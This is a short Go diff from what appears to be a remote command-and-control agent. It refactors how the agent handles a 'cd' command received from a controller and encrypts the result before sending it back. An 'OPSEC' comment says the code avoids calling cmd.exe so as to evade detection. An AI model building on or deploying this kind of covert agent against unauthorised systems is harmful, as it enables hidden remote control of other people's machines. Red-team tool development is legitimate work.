@@ -1824,13 +1824,21 @@ func RunCommand(client_id, job_id, rawCmd string) { //This receives a command to
 		switch args[0] {
 		// OPSEC - Perform alternate actions to avoid calling cmd.exe
 		case "cd":
-			os.Chdir(args[1])
-			mydir, err := os.Getwd()
-			if err == nil {
-				fmt.Println(mydir)
-				encryptedOutput, _ := Encrypt([]byte(mydir))
-				SendResult(client_id, job_id, "output", encryptedOutput)
+			// TODO: Placeholder to verify command interface works
+			cdCmd := command.GetCommand(args[0])
+			cmdArgs := args[1:]
+			var result string
+			if cdCmd != nil {
+				result, err = cdCmd.Run(cmdArgs)
+				if err != nil {
+					result = err.Error()
+				}
+			} else {
+				result = "cd command unavailable"
 			}
+			encryptedOutput, _ := Encrypt([]byte(result))
+			SendResult(client_id, job_id, "output", encryptedOutput)
+
 		case "ls":
 			ls := ls(args[1])
 			encryptedOutput, _ := Encrypt([]byte(ls))
